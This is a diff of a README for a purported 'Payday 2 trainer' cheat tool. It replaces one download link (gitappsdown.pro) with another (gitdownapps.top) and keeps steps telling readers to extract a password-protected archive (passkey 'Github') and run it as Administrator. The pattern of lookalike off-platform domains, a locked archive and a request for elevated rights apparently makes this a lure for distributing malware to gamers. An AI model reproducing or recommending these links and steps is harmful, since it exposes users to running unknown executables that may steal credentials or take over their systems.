@@ -6,7 +6,7 @@ Payday 2 trainer with godmode, unlimited ammo, no recoil, instant heist completi
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -73,7 +73,7 @@ Based on popular tools like **Cheat Engine tables**, **WeMod**, and **MrAntiFun 
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch PAYDAY 2.
 4. Run the trainer **as Administrator**.
